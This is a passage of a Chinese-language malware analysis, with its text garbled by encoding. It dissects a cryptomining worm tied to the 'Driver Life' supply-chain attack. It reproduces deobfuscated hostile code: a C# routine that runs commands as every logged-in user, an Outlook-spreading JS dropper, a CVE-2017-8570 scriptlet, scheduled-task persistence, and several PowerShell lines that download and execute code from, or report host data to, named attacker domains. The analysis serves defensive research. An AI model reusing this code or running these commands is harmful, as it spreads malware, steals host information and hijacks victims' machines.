function New-PacketSMBHeader
function New-PacketSMBNegotiateProtocolRequest
function New-PacketSMBSessionSetupAndXRequest
function New-PacketSMBTreeConnectAndXRequest
function New-PacketSMBNTCreateAndXRequest
function New-PacketSMBReadAndXRequest
function New-PacketSMBWriteAndXRequest
function New-PacketSMBCloseRequest
function New-PacketSMBTreeDisconnectRequest
function New-PacketSMBLogoffAndXRequest
function New-PacketSMB2Header
function New-PacketSMB2NegotiateProtocolRequest
function New-PacketSMB2SessionSetupRequest
function New-PacketSMB2TreeConnectRequest
function New-PacketSMB2CreateRequestFile
function New-PacketSMB2ReadRequest
function New-PacketSMB2WriteRequest
function New-PacketSMB2CloseRequest
function New-PacketSMB2TreeDisconnectRequest
function New-PacketSMB2SessionLogoffRequest
function New-PacketNTLMSSPNegotiate
function New-PacketNTLMSSPAuth
function New-PacketRPCBind
function New-PacketRPCRequest
function New-PacketSCMOpenSCManagerW
function New-PacketSCMCreateServiceW
function New-PacketSCMStartServiceW
function New-PacketSCMDeleteServiceW
function New-PacketSCMCloseServiceHandle
function Get-StatusPending
function Get-UInt16DataLength
function Invoke-SMBC
function ConvertFrom-PacketOrderedDictionary
function New-PacketNetBIOSSessionService
function New-PacketSMBHeader
function New-PacketSMBNegotiateProtocolRequest
function New-PacketSMBSessionSetupAndXRequest
function New-PacketSMB2Header
function New-PacketSMB2NegotiateProtocolRequest
function New-PacketSMB2SessionSetupRequest
function New-PacketSMB2TreeConnectRequest
function New-PacketSMB2CreateRequest
function New-PacketSMB2FindRequestFile
function New-PacketSMB2QueryInfoRequest
function New-PacketSMB2ReadRequest
function New-PacketSMB2WriteRequest
function New-PacketSMB2CloseRequest
function New-PacketSMB2TreeDisconnectRequest
function New-PacketSMB2SessionLogoffRequest
function New-PacketSMB2IoctlRequest
function New-PacketSMB2SetInfoRequest
function New-PacketNTLMSSPNegotiate
function New-PacketNTLMSSPAuth
function Get-UInt16DataLength
function Invoke-SMBGhost
	function check_vul
	function check
function copyrun 
function db_query
function mssqlrun
function sshbrute
function isPubIP 
function getipaddrs
function localscan 
```



##### m6.bin (XMRig)

è‹¥æ˜¯64ä½ç³»ç»Ÿï¼Œæ ¹æ®äº’æ–¥é”ï¼ˆGlobal\eLocalMnï¼‰ä¸‹è½½ï¼š

```
http://d.ackng.com/m6.bin?
MD5 (m6.bin) = 5b2849ff2e8c335dcc60fd2155b2d4d3
```

è¿œç¨‹æ–‡ä»¶`m6.bin`ä¸­ï¼ŒåŒ…å«XMRigç¨‹åºï¼š

ä»¥0x0Aæˆªæ–­

*   å‰åŠéƒ¨åˆ†ä¸ºPowershellè„šæœ¬
    *   é•¿è¾¾2700å¤šè¡Œï¼Œå®šä¹‰test1å‡½æ•°ï¼ŒåŠ33ä¸ªå­å‡½æ•°
    *   ç–‘ä¼¼ä½¿ç”¨https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1

*   ååŠéƒ¨åˆ†ä¸º PE32+ executable (console) x86-64, for MS Windows å¯æ‰§è¡Œæ–‡ä»¶

ä½¿ç”¨test1åå°„å¼æ³¨å…¥ååŠéƒ¨åˆ†çš„exeæ–‡ä»¶åˆ°Powershellè¿›ç¨‹é‡Œè¿è¡Œï¼Œå¹¶ä¸”ä¼šåœ¨å¤–éƒ¨å†æ¬¡è¿è¡Œä¸€æ¬¡



##### m6g.bin (XMRig opencl cuda)

è‹¥æ˜¯64ä½ç³»ç»Ÿï¼Œä¸”æœ‰AMD/NVIDIAçš„æ˜¾å¡ï¼Œåˆ™æ ¹æ®äº’æ–¥é”ï¼ˆGlobal\eLocalMngï¼‰ä¸‹è½½ï¼š

```
http://d.ackng.com/m6g.bin
MD5 (m6g.bin) = 23d59ed726e13edabcb751da7a5ce310
```

ä¸m6.binçš„ä¸åŒï¼Œå®ƒçš„APIå¼€æ”¾ç«¯å£ä¸ºï¼š

```
http://127.0.0.1:43668/1/summary
```



##### if_mail.bin (ä½¿ç”¨Outlookä¼ æ’­ç”Ÿæˆçš„æ¶æ„æ–‡æ¡£)

```
http://d.ackng.com/if_mail.bin
MD5 (if_mail.bin) = 88949e6a329c6b2796ddcc81564cee1a
```

å…¶éƒ¨åˆ†æ ¸å¿ƒä»£ç ï¼š

```powershell
# è‹¥æ˜¯ç®¡ç†å‘˜æƒé™ï¼Œåˆ›å»ºç®¡é“æ‰§è¡Œmail_code 
if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){
    # powershell -c $pipe=new-object System.IO.Pipes.NamedPipeServerStream(''\\.\pipe\HHyeuqi7'')
    # $pipe.WaitForConnection()
    # $sr=new-object System.IO.StreamReader($pipe)
    # $cmd=$sr.ReadToEnd()
    # $sr.Dispose()
    # $pipe.Dispose()
    # IEx($cmd)
    # (new-object System.IO.Pipes.NamedPipeServerStream(''\\.\pipe\HHyeuqi7'')).WaitForConnection()
	$sesscmd='powershell -c $pipe=new-object System.IO.Pipes.NamedPipeServerStream(''\\.\pipe\HHyeuqi7'');$pipe.WaitForConnection();$sr=new-object System.IO.StreamReader($pipe);$cmd=$sr.ReadToEnd();$sr.Dispose();$pipe.Dispose();IEx($cmd);(new-object System.IO.Pipes.NamedPipeServerStream(''\\.\pipe\HHyeuqi7'')).WaitForConnection()'
    # // ä½¿ç”¨Windowsé«˜çº§APIæ¥è·å–å½“å‰ç™»å½•ç”¨æˆ·çš„è®¿é—®ä»¤ç‰Œ,ä»¥è·å–åˆ°çš„ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤
    # // è¿™æ„è®¡ç®—æœºä¸Šæ‰€æœ‰ç™»å½•çš„ç”¨æˆ·ä¼šè¢«å‘é€é‚®ä»¶
    [Utils.ProcessExtensions]::EnumSessionsAndExecCmd($sesscmd.Trim())

	$pipe=new-object System.IO.Pipes.NamedPipeClientStream("\\.\pipe\HHyeuqi7");
    $pipe.Connect();
    $sw=new-object System.IO.StreamWriter($pipe);
    $sw.WriteLine($mail_code);
    $sw.Dispose();
    $pipe.Dispose()
	(new-object System.IO.Pipes.NamedPipeClientStream("\\.\pipe\HHyeuqi7")).Connect()
	"Done and exit..."
}else{
	IEx $mail_code
}

new-item $env:tmp\godmali3.txt -type file -force
```

åœ¨å½“å‰ç¯å¢ƒä¸­æ³¨å…¥ä¸€æ®µC#ä»£ç 

ç”¨äºè°ƒç”¨Windowsé«˜çº§APIæ¥è·å–å½“å‰ç™»å½•ç”¨æˆ·çš„è®¿é—®ä»¤ç‰Œ,ä»¥è·å–åˆ°çš„ç”¨æˆ·èº«ä»½æ‰§è¡Œmail_codeåŒ…å«çš„å‘½ä»¤

è¿™æ„å‘³ç€ä¼šå½±å“è®¡ç®—æœºä¸Šæ‰€æœ‰ç™»å½•ç”¨æˆ·

```c#
using System;
using System.Runtime.InteropServices;
namespace Utils
{
    public static class ProcessExtensions
    {
        private const uint INVALID_SESSION_ID = 0xFFFFFFFF;
        [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcessAsUser(
            IntPtr hToken,
            String lpApplicationName,
            String lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandle,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            String lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
        private static extern bool DuplicateTokenEx(
            IntPtr ExistingTokenHandle,
            uint dwDesiredAccess,
            IntPtr lpThreadAttributes,
            int TokenType,
            int ImpersonationLevel,
            ref IntPtr DuplicateTokenHandle);
        [DllImport("userenv.dll", SetLastError = true)]
        private static extern bool CreateEnvironmentBlock(ref IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
        [DllImport("userenv.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hSnapshot);
        [DllImport("Wtsapi32.dll", SetLastError=true)]
        private static extern bool WTSQueryUserToken(uint SessionId, ref IntPtr phToken);
        [DllImport("wtsapi32.dll", SetLastError = true)]
        private static extern int WTSEnumerateSessions(
            IntPtr hServer,
            int Reserved,
            int Version,
            ref IntPtr ppSessionInfo,
            ref int pCount);
        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public String lpReserved;
            public String lpDesktop;
            public String lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        private enum WTS_CONNECTSTATE_CLASS
        {
            WTSActive,
            WTSConnected,
            WTSConnectQuery,
            WTSShadow,
            WTSDisconnected,
            WTSIdle,
            WTSListen,
            WTSReset,
            WTSDown,
            WTSInit
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct WTS_SESSION_INFO
        {
            public readonly UInt32 SessionID;
            [MarshalAs(UnmanagedType.LPStr)]
            public readonly String pWinStationName;
            public readonly WTS_CONNECTSTATE_CLASS State;
        }
        private static void StartProcessWithToken(ref IntPtr hUserToken,string cmd)
        {
            STARTUPINFO startInfo = new STARTUPINFO();
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
            IntPtr pEnv = IntPtr.Zero;
			if(CreateEnvironmentBlock(ref pEnv,hUserToken,false))
			{
				Console.WriteLine("Create Environment Block Success");
			}
			
            startInfo.cb = Marshal.SizeOf(typeof(STARTUPINFO));
            uint dwCreationFlags = 0x00000400 | 0x08000000;
			//uint dwCreationFlags = 0x00000400 | 0x00000010;
            startInfo.wShowWindow = 0;
            startInfo.dwFlags = 1;
            startInfo.lpDesktop = "winsta0\\default";
            if (CreateProcessAsUser(hUserToken,
                "c:\\windows\\system32\\cmd.exe",
                "/c "+cmd,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                dwCreationFlags,
                pEnv,
                null,
                ref startInfo,
                out procInfo))
            {
            	Console.WriteLine("Start Process Success");
            } else 
			{
				Console.WriteLine(Marshal.GetLastWin32Error());
			}
            CloseHandle(hUserToken);
            CloseHandle(procInfo.hThread);
            CloseHandle(procInfo.hProcess);
        }
        public static void EnumSessionsAndExecCmd(string cmd)
        {
            IntPtr hImpersonationToken = IntPtr.Zero;
            IntPtr pSessionInfo = IntPtr.Zero;
            int sessionCount = 0;
            int arrayElementSize = Marshal.SizeOf(typeof(WTS_SESSION_INFO));
            IntPtr phUserToken = IntPtr.Zero;
            if (WTSEnumerateSessions(IntPtr.Zero, 0, 1, ref pSessionInfo, ref sessionCount) != 0)
            {
                Int64 current = pSessionInfo.ToInt64();
                for (int i = 0; i < sessionCount; i++)
                {
                    WTS_SESSION_INFO si = (WTS_SESSION_INFO)Marshal.PtrToStructure((IntPtr)(current), typeof(WTS_SESSION_INFO));
                    current += arrayElementSize;
                    Console.WriteLine("Get Session ID:"+si.SessionID);
                    if (WTSQueryUserToken(si.SessionID, ref hImpersonationToken))
                    {
                    	Console.WriteLine("Get Session Token Success");
                    	if (DuplicateTokenEx(hImpersonationToken, 0, IntPtr.Zero, 2, 1, ref phUserToken))
                    	{
                    		Console.WriteLine("Duplicate Token Success");
                    		StartProcessWithToken(ref phUserToken,cmd);
                    	}
                    }
                }
            }
        }
    }
}
```

åœ¨mail_codeå˜é‡ä¸­å®šä¹‰é‚®ä»¶æ”»å‡»ç›¸å…³ä»£ç å—ï¼Œä¸»è¦ä½œç”¨æ˜¯ï¼š

```powershell
# å‘é€è·å–çš„é‚®ç®±ç›¸å…³ä¿¡æ¯ é“¾æ¥è¿”å›404 
(New-object net.webclient).downloadstring("http://d.ackng.com/report.json?type=mail&u=$muser&c1="+$contacts.count+"&c2="+$sent_tos.count+"&c3="+$recv_froms.count)
```

ç”ŸæˆåŒ…å«æ¶æ„è„šæœ¬çš„JSæ–‡ä»¶ (readme.js)

```powershell
function Add-Zip
{
    param([string]$zipfilename)
    if(-not (test-path($zipfilename)))
    {
        set-content $zipfilename ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
        (dir $zipfilename).IsReadOnly = $false  
    }
	
    $shellApplication = new-object -com shell.application
    $zipPackage = $shellApplication.NameSpace($zipfilename)
    
	foreach($file in $input) 
    { 
            $zipPackage.CopyHere($file.FullName)
            Start-sleep -milliseconds 500
    }
}


$att_js=$env:tmp+"\readme.js"
$js_code='var cmd =new ActiveXObject("WScript.Shell");var cmdstr="cmd /c start /b notepad "+WScript.ScriptFullName+" & powershell -w hidden IEx(New-Object Net.WebClient).DownLoadString(''THEURL/7p.php?VER*mail_js*%username%*%computername%*''+[Environment]::OSVersion.version.Major);bpu (''THEURL/mail.jsp?js_VER'')";cmd.run(cmdstr,0,1);'.replace("THEURL",$base_url).replace("VER",$version)


# JSæ–‡ä»¶é•¿åº¦æ··æ·†
($js_text+"`r`n"*(2000+(get-random)%1000)+" "*(102+(get-random)%100)+$js_code.trim())|out-file $att_js
$att_zip_name="readme.zip"
$att_zip=$env:tmp+"\$att_zip_name"
dir $att_js|Add-Zip $att_zip
```

ç”ŸæˆåŒ…å«é’ˆå¯¹CVE-2017-8570æ¼æ´ä¸å¾®è½¯OfficeDDEï¼ˆåŠ¨æ€æ•°æ®äº¤æ¢ï¼‰æ”»å‡»çš„æ¶æ„UTFæ–‡æ¡£ï¼ˆä¹‹å‰å«ä½œurgent.doc ç°åœ¨å« readme.docï¼‰

æ–‡æ¡£æ‰“å¼€åçš„æˆªå›¾ï¼š

<img src="./README.assets/20200611image-20200507152621697.png" style="zoom:25%;" />



æ¯ä¸€æ¬¡é‚®ä»¶å‘é€éƒ½ä¼šåŠ¨æ€ç”Ÿæˆéšæœº15ä½éšæœºå­—ç¬¦å‘½åçš„sctæ–‡ä»¶

```powershell
$filename=-join([char[]](48..57+65..90+97..122)|Get-Random -Count 15)+".sct"
```

ç„¶åé€šè¿‡CVE-2017-8570æ¼æ´åˆ©ç”¨ï¼Œå°†sctæ–‡ä»¶å†™å…¥RTFæ–‡æ¡£ï¼Œåœ¨æ–‡æ¡£æ‰“å¼€æ—¶Packageå¯¹è±¡ä¸­åŒ…å«çš„`.sct`æ–‡ä»¶è„šæœ¬æ–‡ä»¶ä¼šè‡ªåŠ¨é‡Šæ”¾è‡³ä¸´æ—¶ç›®å½•ï¼Œè¯¥`.sct`æ–‡ä»¶å°†ç”±RTFæ–‡æ¡£ä¸­çš„ç¬¬äºŒä¸ªobjdataåŠ è½½æ‰§è¡Œï¼Œæ‰§è¡Œåä¼šè‡ªèº«åˆ é™¤

`.sct`æ–‡ä»¶å†…å®¹ï¼š

```xml
<?XML version="1.0"?>
<scriptlet>

<registration
    description="fjzmpcjvqp"
    progid="fjzmpcjvqp"
    version="1.00"
    classid="{204774CF-D251-4F02-855B-2BE70585184B}"
    remotable="true"
    >
</registration>

<script language="JScript">
<![CDATA[
        new ActiveXObject("WScript.Shell").Run('cmd /c powershell -w hidden IEx(New-Object Net.WebClient).DownLoadString(\'http://t.t\'+\'r2q.com/7p.php?0.7*mail_doc*%username%*%computername%*\'+[Environment]::OSVersion.version.Major);bpu (\'http://t.t\'+\'r2q.com/mail.jsp?doc_0.7\')&del %tmp%\\GUOtwYxlpzKPBSh.sct',0,1);window.close();
]]>
</script>

</scriptlet>

```

å…¶æ‰§è¡Œä»£ç ï¼Œç¾åŒ–åçš„æ˜¾ç¤ºï¼š

```powershell
IEx(New-Object Net.WebClient).DownLoadString('http://t.tr2q.com/7p.php?0.7*mail_doc*%username%*%computername%*'+[Environment]::OSVersion.version.Major);
bpu ('http://t.tr2q.com/mail.jsp?doc_0.7');
del %tmp%/RANDOM.sct
```

ä½¿ç”¨OfficeDDEåŠŸèƒ½è¿›è¡ŒäºŒæ¬¡è§¦å‘ï¼š

```powershell
$dde_cmd="powershell [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:%tmp%\$filename').Exec(0)&"
```

æœ€åç”Ÿæˆflagæ–‡ä»¶ï¼Œè¡¨ç¤ºå·²å‘é€è¿‡é‚®ä»¶

```powershell
$env:tmp/godmali3.txt
```



##### report.jsp ï¼ˆå†™å…¥å®šæ—¶ä»»åŠ¡blackballï¼‰

æºå¸¦ä¿¡æ¯:

>   *è®¡ç®—æœºåï¼ŒGUIDï¼ŒMACåœ°å€ï¼Œç³»ç»Ÿï¼Œç³»ç»Ÿä½æ•°ï¼Œç”¨æˆ·ï¼ŒåŸŸï¼Œç£ç›˜ï¼Œæ˜¾å¡ï¼Œå†…å­˜ï¼Œç®¡ç†å‘˜æƒé™ï¼Œæœ¬åœ°è •è™«æ”»å‡»Payloadï¼Œæœ¬åœ°xmrigPayloadï¼Œxmrigç‰ˆæœ¬ï¼ŒçŸ¿æ± åœ°å€ï¼Œç®—åŠ›ï¼Œå¼€æœºæ—¶é—´ï¼Œä¸Šä¼ æ—¶é—´*

```
http://t.awcna.com/report.jsp?EMOSMAC2077&05DCA6CB-2A44-C943-9E0D-9ABF4B11DCA8&00:1C:42:6E:F5:42&7 æ——èˆ°ç‰ˆ _6.1.7601&1&EMo&WORKGROUP&&Parallels Display Adapter (WDDM)&2.25&1&&5B2849&&&&227546.396&&0.1
MD5 (report.jsp) = 6038cd68f69ac785118bb5b0d058b667
```

å»é™¤å¤šå±‚æ··æ·†åçš„æºä»£ç ï¼š

```powershell
# è‹¥ä¸å­˜åœ¨ä¼ æ’­æ–¹å¼å˜é‡$våˆ™ä¸º?mig_20200427
if(!$v){
	$v='?mig_'+(Get-Date -Format 'yyyyMMdd')
}
# $v='mail'
$tmps='function a($u){$d=(Ne`w-Obj`ect Net.WebC`lient)."DownloadData"($u);$c=$d.count;if($c -gt 173){$b=$d[173..$c];$p=New-Object Security.Cryptography.RSAParameters;$p.Modulus=[convert]::FromBase64String(''2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10='');$p.Exponent=0x01,0x00,0x01;$r=New-Object Security.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(-join([char[]]$d[0..171])))){I`ex(-join[char[]]$b)}}}$url=''http://''+''U1''+''U2'';a($url+''/a.jsp'+$v+'?''+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join''*''))'

$sa=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
function getRan(){return -join([char[]](48..57+65..90+97..122)|Get-Random -Count (6+(Get-Random)%6))}
$us=@('t.awcna.com','t.tr2q.com','t.amynx.com')

$stsrv = New-Object -ComObject Schedule.Service
$stsrv.Connect()

# æŸ¥çœ‹æ˜¯å¦å·²ç»å­˜åœ¨åä¸ºblackballçš„å®šæ—¶ä»»åŠ¡
try{
	$doit=$stsrv.GetFolder("\").GetTask("blackball")
}catch{}
# è‹¥ä¸å­˜åœ¨è¿›è¡Œ
if(-not $doit){
	if($sa){
		# æ¯120åˆ†é’Ÿæ‰§è¡Œblackball 
		schtasks /create /ru system /sc MINUTE /mo 120 /tn blackball /F /tr "blackball"
	} else {
		schtasks /create /sc MINUTE /mo 120 /tn blackball /F /tr "blackball"
	}
	foreach($u in $us){
		$i = [array]::IndexOf($us,$u)
		# å†™å…¥è®¡åˆ’ä»»åŠ¡çš„ä½ç½®
		if($i%3 -eq 0){$tnf=''}
		if($i%3 -eq 1){$tnf=getRan}
		if($i%3 -eq 2){if($sa){$tnf='MicroSoft\Windows\'+(getRan)}else{$tnf=getRan}}
		$tn = getRan
		if($sa){
			schtasks /create /ru system /sc MINUTE /mo 60 /tn "$tnf\$tn" /F /tr "powershell -c PS_CMD"
		} else {
			schtasks /create /sc MINUTE /mo 60 /tn "$tnf\$tn" /F /tr "powershell -w hidden -c PS_CMD"
		}
		start-sleep 1
		$folder=$stsrv.GetFolder("\$tnf")
		$taskitem=$folder.GetTasks(1)
		foreach($task in $taskitem){
			foreach ($action in $task.Definition.Actions) {
				try{
					if($action.Arguments.Contains("PS_CMD")){	
						$folder.RegisterTask($task.Name, $task.Xml.replace("PS_CMD",$tmps.replace('U1',$u.substring(0,5)).replace('U2',$u.substring(5))), 4, $null, $null, 0, $null)|out-null
					}
				}catch{}
			}
		}
		schtasks /run /tn "$tnf\$tn"
		start-sleep 5
	}
}

```

æŸ¥çœ‹æ˜¯å¦å·²ç»å­˜åœ¨åä¸ºblackballçš„å®šæ—¶ä»»åŠ¡,

ä¸å­˜åœ¨åˆ™åˆ›å»ºå®šæ—¶ä»»åŠ¡æ‰§è¡Œä»¥è·å–è¿œç¨‹æ–‡ä»¶`a.jsp`



ä»¥ä¸‹æ˜¯éƒ¨åˆ†è¿œç¨‹è„šæœ¬ä¸­çº¯ä¸ºå®Œæˆä¿¡æ¯åé¦ˆçš„URLï¼ˆè®¿é—®è¿”å›404ï¼‰ ï¼š

*   `http://d.ackng.com/report.json`
*   `http://d.ackng.com/log.json`

```powershell
# if.bin
(New-Object Net.WebClient).DownloadString('http://d.ackng.com/report.json?v='+$VVERSION+'&type=smbhost&ip='+$currip+'&t='+$t)

(New-Object Net.WebClient).DownloadString('http://d.ackng.com/report.json?v='+$VVERSION+'&type=ms&ip='+$currip+'&pass='+$allpass[$n]+'&t='+$t)

## é™¤åŸºç¡€ç¯å¢ƒä¿¡æ¯å¤–è¿˜åŒ…å«æ¯ä¸ªå·²æ‰§è¡Œæ¨¡å—çš„çŠ¶æ€ä¿¡æ¯
(New-Object Net.WebClient).DownloadString($down_url+'/log.json?V='+$VVERSION+'&'+$comp_name+'&'+$guid+'&'+$mac+'&r='+$retry+'&pc1='+$smb_portopen[1].count+'&pc2='+$ms_portopen[1].count+'&pc3='+$old_portopen[1].count+'&pc4='+$rdp_portopen[1].count+'&pci='+$ipaddrs_i.count+'&pco='+$ipaddrs_o.count+'&pcb='+$global:ipaddrs_b+'&pcs='+$pcs+'&mi='+($getpasswd -join "^^")+'&wf='+[Int]$wf+'&mf='+[Int]$mf)

# ifmail.bin
## é‚®ä»¶å‘é€åé‚®ç®±è”ç³»äººç›¸å…³ä¿¡æ¯
(New-object net.webclient).downloadstring("http://d.ackng.com/report.json?type=mail&u=$muser&c1="+$contacts.count+"&c2="+$sent_tos.count+"&c3="+$recv_froms.count)
```




### å¼€æºé¡¹ç›®çš„åˆ©ç”¨

è¯¥ç»„ç»‡åˆ©ç”¨äº†å¤§é‡å¼€æºé¡¹ç›®ï¼Œæ¥æ„å»ºæ”»å‡»é“¾ï¼Œä»¥ä¸‹æ˜¯å…¶ç›¸å…³å¼€æºé¡¹ç›®åŠå¯¹åº”å…³ç³»ï¼š

https://github.com/xmrig/xmrig-cuda/releases

>   xmrigæŒ–çŸ¿ç¨‹åº

https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1

>   å°†æŒ–çŸ¿ç¨‹åºxmrigï¼Œåå°„å¼æ³¨å…¥powershell.exeä¸­

https://github.com/rxwx/CVE-2017-8570

>   OLEæ”»å‡»æ–‡æ¡£ä»£ç ç”Ÿæˆçš„æ¥æº
>
>   *æ³¨æ„ï¼šscriptletä»£ç ä¸å…ˆå‰å¼•ç”¨çš„[CVE-2017-8570](https://github.com/rxwx/CVE-2017-8570)çš„Githubé¡µé¢ä¸Šæ˜¾ç¤ºçš„ä»£ç å®Œå…¨åŒ¹é…ã€‚*
>
>   *å­—ç¬¦ä¸²â€œ fjzmpcjvqpâ€æ˜¯å”¯ä¸€çš„ï¼Œå¦‚æœè¯¥ä»£ç ä¸æ˜¯ä½¿ç”¨ç›¸åŒçš„å…¬å…±POCæ¼æ´åˆ©ç”¨ä»£ç ç”Ÿæˆçš„ï¼Œåˆ™ä¸åº”è¯¥å¦‚æ­¤å·§åˆã€‚*

https://github.com/mardahl/MyScripts-iphase.dk/blob/master/function_executeAsLoggedOnUser.ps1

>   ç”¨äºif_mail.jspä¸­åœ¨æ‰€ç™»å½•ç”¨æˆ·ä¸Šæ‰§è¡Œ

https://github.com/FreeRDP/FreeRDP

>   wfree.exe çš„æ¥æº

https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1

>   å“ˆå¸Œä¼ é€’æ”»å‡»æ¨¡å—æ¥æº

https://github.com/ollypwn/SMBGhost

>   CVE-2020-0796 SMBGhost POC å‚ç…§è¯¥Pythoné¡¹ç›®ä¿®æ”¹ä¸ºPowershellç‰ˆæœ¬








##  å‚è€ƒé“¾æ¥

### ç›¸å…³æ”»å‡»äº‹ä»¶

2018-12-15

åˆ©ç”¨â€œé©±åŠ¨äººç”Ÿâ€å‡çº§ç¨‹åºçš„æ¶æ„ç¨‹åºé¢„è­¦ 360

>   ackng.com dl.haqo.net p.abbny.com

https://cert.360.cn/warning/detail?id=57cc079bc4686dd09981bf034130f1c9

â€œé©±åŠ¨äººç”Ÿâ€åˆ©ç”¨é«˜å±æ¼æ´ä¼ æ’­ç—…æ¯’ 12æœˆ14æ—¥åŠå¤©æ„ŸæŸ“æ•°ä¸‡å°ç”µè„‘  ç«ç»’

https://mp.weixin.qq.com/s?biz=MzI3NjYzMDM1Mg==&mid=2247485801&idx=1&sn=233c83c3dec9376b3d04d7ddd40903e6&scene=21#wechat_redirect

 2018-12-17

ä¸€åœºç²¾å¿ƒç­–åˆ’çš„é’ˆå¯¹é©±åŠ¨äººç”Ÿå…¬å¸çš„å®šå‘æ”»å‡»æ´»åŠ¨åˆ†æ è…¾è®¯

>   pull.update.ackng.com

https://mp.weixin.qq.com/s/ctBgivcvH216dwq00WRmOA

é©±åŠ¨äººç”Ÿæ——ä¸‹åº”ç”¨åˆ†å‘æ¶æ„ä»£ç äº‹ä»¶åˆ†æ - ä¸€ä¸ªä¾›åº”é“¾æ”»å‡»çš„æ¡ˆä¾‹ å¥‡å®‰ä¿¡

https://ti.qianxin.com/blog/articles/an-attack-of-supply-chain-by-qudongrensheng/

>   é©±åŠ¨äººç”Ÿå…¬å¸å›¢é˜Ÿåœ¨åç»­å‘å¸ƒçš„å…³äºæ”»å‡»æ´»åŠ¨çš„å£°æ˜ä¸­è¯´ä»–ä»¬å½“æ—¶æ­£åœ¨å›¢å»ºæ´»åŠ¨ä¸­ï¼Œå¦‚æœç¡®å®ä¸ºå¤–éƒ¨çš„æ”»å‡»ï¼Œé‚£æ˜æ˜¾æ˜¯ä¸€ä¸ªå¯¹å…¬å¸çš„è¿ä½œéå¸¸ç†Ÿæ‚‰çš„äººå‘˜æ‰§è¡Œçš„ä¸€åœºæœ‰é¢„è°‹çš„çªè¢­ã€‚ï¼ˆè¿™ç‚¹ä¼°è®¡åªæ˜¯ä¸ºç”©é”…æ‰è¯´çš„â€¦â€¦ï¼‰

2018-12-19

è­¦æŠ¥ï¼â€œæ°¸æ’ä¹‹è“â€ä¸‹è½½å™¨æœ¨é©¬å†åº¦æ›´æ–° 360

>   r.minicen.ga 

http://www.360.cn/n/10528.html

2019-01-24

åŠ«æŒâ€œé©±åŠ¨äººç”Ÿâ€çš„æŒ–çŸ¿è •è™«å†æ¬¡æ´»è·ƒ  å¥‡å®‰ä¿¡

https://mp.weixin.qq.com/s?__biz=MzI2MDc2MDA4OA==&mid=2247486576&idx=1&sn=dc5ff6a05fac06608365823173d17dae

2019-01-28

æ›¾åˆ©ç”¨é©±åŠ¨äººç”Ÿå‡çº§é€šé“ä¼ æ’­çš„æœ¨é©¬ä¸‹è½½å™¨å†æ¬¡å‡çº§ è…¾è®¯

https://guanjia.qq.com/news/n3/2475.html

2019-01-30

é©±åŠ¨äººç”Ÿä¾›åº”é“¾æœ¨é©¬æ”»å‡»2019.1.30å˜ç§æœ¨é©¬åˆ†æ 360 

https://payloads.online/archivers/2019-02-23/1

2019-02-14

åŒä¸€å›¢ä¼™è¿˜æ˜¯æ ½èµƒå«ç¥¸ï¼Ÿä¸¨â€œé©±åŠ¨äººç”Ÿâ€åŠ«æŒäº‹ä»¶ä¸Mykingså®¶æ—æ´»åŠ¨çš„å…³è”åˆ†æ

>   å‘ç°ä¸€äº›æ¶‰åŠMykingså®¶æ—æ´»åŠ¨çš„ç°è±¡ï¼Œä½†æœªèƒ½å¾—å‡ºç¡®å®šæ€§çš„ç»“è®º (å› ä¸º81.177.135.35)  

https://www.freebuf.com/articles/system/195337.html

2019-02-20

Monero Miner-Malware Uses RADMIN, MIMIKATZ to Infect, Propagate via Vulnerability

>   haqo.net abbny.com æ–°å‡ºç°  beahh.com  ï¼ˆä¸r.minicen.gaç›¸åŒè§£æ27.102.107.137ï¼‰

https://blog.trendmicro.com/trendlabs-security-intelligence/monero-miner-malware-uses-radmin-mimikatz-to-infect-propagate-via-vulnerability/



2019-02-22

